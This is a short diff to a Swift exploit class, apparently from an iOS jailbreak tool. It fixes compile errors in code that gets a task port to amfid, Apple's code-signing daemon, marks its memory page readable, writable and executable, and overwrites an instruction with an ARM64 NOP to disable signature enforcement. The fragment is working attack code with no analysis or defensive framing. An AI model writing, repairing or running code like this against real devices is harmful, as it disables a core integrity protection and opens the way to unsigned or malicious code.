@@ -259,7 +259,6 @@ final class ExpAmfidNopFinal {
         
         // If we got a name port, try to read amfid's memory to verify text base
         if kr2 == KERN_SUCCESS && namePort != 0 {
-            var addr: mach_vm_address_t = UInt64(patchAddr)
             var data: vm_offset_t = 0
             var dataCnt: mach_msg_type_number_t = 0
             let readKr = mach_vm_read(namePort, mach_vm_address_t(patchAddr), 4, &data, &dataCnt)
@@ -315,7 +314,7 @@ final class ExpAmfidNopFinal {
         let pageAddr = patchAddr & ~0xFFF
         
         // mach_vm_protect
-        let protKr = mach_vm_protect(taskPort, mach_vm_address_t(pageAddr), 0x4000, 0, VM_PROT_ALL)
+        let protKr = mach_vm_protect(taskPort, mach_vm_address_t(pageAddr), 0x4000, 0, vm_prot_t(VM_PROT_ALL))
         log("  mach_vm_protect: kr=\(protKr)")
         guard protKr == KERN_SUCCESS else {
             log("❌ mach_vm_protect failed")
@@ -348,8 +347,10 @@ final class ExpAmfidNopFinal {
         
         // Write NOP
         var nop: UInt32 = 0xD503201F
-        let writeKr = mach_vm_write(taskPort, mach_vm_address_t(patchAddr),
-                                     vm_offset_t(bitPattern: &nop), 4)
+        let writeKr = withUnsafePointer(to: &nop) { ptr -> kern_return_t in
+            mach_vm_write(taskPort, mach_vm_address_t(patchAddr),
+                         vm_offset_t(bitPattern: ptr), mach_msg_type_number_t(MemoryLayout<UInt32>.size))
+        }
         log("  mach_vm_write: kr=\(writeKr)")
         
         guard writeKr == KERN_SUCCESS else {
